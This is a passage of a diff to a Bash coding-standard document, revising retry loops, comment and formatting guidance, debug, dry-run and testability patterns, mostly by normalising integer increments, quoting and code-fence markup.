-    ((attempt+=1))
+    attempt+=1
   done
 
   return 1
@@ -22162,7 +22088,7 @@ retry_with_jitter() {
     local -i delay=$((base_delay + jitter))
 
     sleep "$delay"
-    ((attempt+=1))
+    attempt+=1
   done
 
   return 1
@@ -22186,7 +22112,7 @@ while ((attempt <= max_attempts)); do
   fi
 
   sleep $((2 ** attempt))
-  ((attempt+=1))
+  attempt+=1
 done
 
 ((attempt > max_attempts)) && die 1 'Max retries exceeded'
@@ -22203,10 +22129,10 @@ while ! command; do
 done
 
 # ✓ Correct - exponential backoff
-attempt=1
+declare -i attempt=1
 while ! command; do
   sleep $((2 ** attempt))
-  ((attempt+=1))
+  attempt+=1
   ((attempt > 5)) && break
 done
 ```
@@ -22224,8 +22150,6 @@ retry_with_backoff 5 curl -f "$url"
 **See Also:** BCS1409 (Timeout Handling), BCS1406 (Background Jobs)
 
 **Full implementation:** See `examples/exemplar-code/checkpoint` lines 850-870
-
-#fin
 
 
 ---
@@ -22279,7 +22203,7 @@ This section covers code formatting, documentation practices, and development pa
 
 Focus comments on explaining **WHY** (rationale, business logic, non-obvious decisions) rather than **WHAT** (which the code already shows):
 
-\`\`\`bash
+```bash
 # Section separator (80 dashes)
 # --------------------------------------------------------------------------------
 
@@ -22308,7 +22232,7 @@ if ((BUILTIN_REQUESTED)); then
   # Print warning message
   warn 'bash-builtins package not found, attempting to install...'
 fi
-\`\`\`
+```
 
 **Good comment patterns:**
 - Explain non-obvious business rules or edge cases
@@ -22344,12 +22268,12 @@ Avoid use of any other icon/emoticon unless it can be justified.
 
 Use blank lines strategically to improve readability by creating visual separation between logical blocks:
 
-\`\`\`bash
+```bash
 #!/bin/bash
 set -euo pipefail
 
 # Script metadata
-declare -r VERSION='1.0.0'
+declare -r VERSION=1.0.0
 #shellcheck disable=SC2155
 declare -r SCRIPT_PATH=$(realpath -- "$0")
 declare -r SCRIPT_DIR=${SCRIPT_PATH%/*}
@@ -22382,7 +22306,7 @@ main() {
 
 main "$@"
 #fin
-\`\`\`
+```
 
 **Guidelines:**
 - One blank line between functions
@@ -22403,7 +22327,7 @@ main "$@"
 
 Use lightweight section comments to organize code into logical groups. These are simpler than full 80-dash separators and provide just enough context:
 
-\`\`\`bash
+```bash
 # Default values
 declare -- PREFIX=/usr/local
 declare -i VERBOSE=1
@@ -22427,8 +22351,8 @@ info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
 
 # Unconditional messaging functions
 error() { >&2 _msg "$@"; }
-die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
-\`\`\`
+die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
+```
 
 **Guidelines:**
 - Use simple \`# Description\` format (no dashes, no box drawing)
@@ -22548,27 +22472,27 @@ sorted_data=$(sort "$file")
 ## Development Practices
 
 #### ShellCheck Compliance
-ShellCheck is **compulsory** for all scripts. Use \`#shellcheck disable=...\` only for documented exceptions.
+ShellCheck is **compulsory** for all scripts. Use `#shellcheck disable=...` only for documented exceptions.
 
-\`\`\`bash
+```bash
 # Document intentional violations with reason
 #shellcheck disable=SC2046  # Intentional word splitting for flag expansion
-set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}"
+set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"
 
 # Run shellcheck as part of development
 shellcheck -x myscript.sh
-\`\`\`
+```
 
 #### Script Termination
-\`\`\`bash
+```bash
 # Always end scripts with #fin (or #end) marker
 main "$@"
 #fin
 
-\`\`\`
+```
 
 #### Defensive Programming
-\`\`\`bash
+```bash
 # Default values for critical variables
 : "${VERBOSE:=0}"
 : "${DEBUG:=0}"
@@ -22578,23 +22502,23 @@ main "$@"
 
 # Guard against unset variables
 set -u
-\`\`\`
+```
 
 #### Performance Considerations
-\`\`\`bash
+```bash
 # Minimize subshells
 # Use built-in string operations over external commands
 # Batch operations when possible
 # Use process substitution over temp files
-\`\`\`
+```
 
 #### Testing Support
-\`\`\`bash
+```bash
 # Make functions testable
 # Use dependency injection for external commands
 # Support verbose/debug modes
 # Return meaningful exit codes
-\`\`\`
+```
 
 
 ---
@@ -22606,12 +22530,12 @@ set -u
 
 Enable debugging features for development and troubleshooting.
 
-\`\`\`bash
+```bash
 # Debug mode implementation
 declare -i DEBUG="${DEBUG:-0}"
 
 # Enable trace mode when DEBUG is set
-((DEBUG)) && set -x
+((DEBUG)) && set -x ||:
 
 # Enhanced PS4 for better trace output
 export PS4='+ ${BASH_SOURCE##*/}:${LINENO}:${FUNCNAME[0]:+${FUNCNAME[0]}():} '
@@ -22624,7 +22548,7 @@ debug() {
 
 # Usage
 DEBUG=1 ./script.sh  # Run with debug output
-\`\`\`
+```
 
 
 ---
@@ -22636,7 +22560,7 @@ DEBUG=1 ./script.sh  # Run with debug output
 
 Implement preview mode for operations that modify system state, allowing users to see what would happen without making actual changes.
 
-\`\`\`bash
+```bash
 # Declare dry-run flag
 declare -i DRY_RUN=0
 
@@ -22679,11 +22603,11 @@ update_man_database() {
   # Actual man database update
   mandb -q 2>/dev/null || true
 }
-\`\`\`
+```
 
 **Pattern structure:**
-1. Check \`((DRY_RUN))\` at the start of functions that modify state
-2. Display preview message with \`[DRY-RUN]\` prefix using \`info\`
+1. Check `((DRY_RUN))` at the start of functions that modify state
+2. Display preview message with `[DRY-RUN]` prefix using `info`
 3. Return early (exit code 0) without performing actual operations
 4. Proceed with real operations only when dry-run is disabled
 
@@ -22705,7 +22629,7 @@ update_man_database() {
 
 Patterns for making scripts testable.
 
-\`\`\`bash
+```bash
 # Dependency injection for testing
 declare -f FIND_CMD >/dev/null || FIND_CMD() { find "$@"; }
 declare -f DATE_CMD >/dev/null || DATE_CMD() { date "$@"; }
@@ -22725,19 +22649,19 @@ declare -i TEST_MODE="${TEST_MODE:-0}"
 # Conditional behavior for testing
 if ((TEST_MODE)); then
   # Use test data directory
-  DATA_DIR='./test_data'
+  DATA_DIR=./test_data
   # Disable destructive operations
   RM_CMD() { echo "TEST: Would remove $*"; }
 else
-  DATA_DIR='/var/lib/app'
+  DATA_DIR=/var/lib/app
   RM_CMD() { rm "$@"; }
 fi
 
 # Assert function for tests
 assert() {
-  local -- expected="$1"
-  local -- actual="$2"
-  local -- message="${3:-Assertion failed}"
+  local -- expected=$1
+  local -- actual=$2
+  local -- message=${3:-Assertion failed}
 
   if [[ "$expected" != "$actual" ]]; then
     >&2 echo "ASSERT FAIL: $message"
@@ -22767,7 +22691,7 @@ run_tests() {
   echo "Tests: $passed passed, $failed failed"
   ((failed == 0))
 }
-\`\`\`
+```
 
 
 ---
@@ -22779,7 +22703,7 @@ run_tests() {
 
 Manage script state by modifying boolean flags based on runtime conditions, separating decision logic from execution.
 
-\`\`\`bash
+```bash
 # Initial flag declarations
 declare -i INSTALL_BUILTIN=0
 declare -i BUILTIN_REQUESTED=0
@@ -22835,7 +22759,7 @@ main() {
 
   show_completion_message
 }
-\`\`\`
+```
 
 **Pattern structure:**
 1. Declare all boolean flags at the top with initial values
@@ -22847,7 +22771,7 @@ main() {
 4. Execute actions based on final flag state
 
 **Real-world example - conditional builtin installation:**
-\`\`\`bash
+```bash
 # Initial state (defaults)
 declare -i INSTALL_BUILTIN=0
 declare -i BUILTIN_REQUESTED=0
@@ -22860,7 +22784,7 @@ INSTALL_BUILTIN=1
 BUILTIN_REQUESTED=1
 
 # 2. Override check (--no-builtin takes precedence)
-((SKIP_BUILTIN)) && INSTALL_BUILTIN=0
+((SKIP_BUILTIN)) && INSTALL_BUILTIN=0 ||:
 
 # 3. Dependency check (no bash-builtins package)
 if ! check_builtin_support; then
@@ -22878,17 +22802,17 @@ fi
 
 # 5. Final execution (only runs if INSTALL_BUILTIN=1)
 ((INSTALL_BUILTIN)) && install_builtin
-\`\`\`
+```
 
 **Benefits:**
 - Clean separation between decision logic and action
 - Easy to trace how flags change throughout execution
 - Fail-safe behavior (disable features when prerequisites fail)
-- User intent preserved (\`BUILTIN_REQUESTED\` tracks original request)
+- User intent preserved (`BUILTIN_REQUESTED` tracks original request)
 - Idempotent (same input → same state → same output)
 
 **Guidelines:**
-- Group related flags together (e.g., \`INSTALL_*\`, \`SKIP_*\`)
+- Group related flags together (e.g., `INSTALL_*`, `SKIP_*`)
 - Use separate flags for user intent vs. runtime state
 - Document state transitions with comments
 - Apply state changes in logical order (parse → validate → execute)
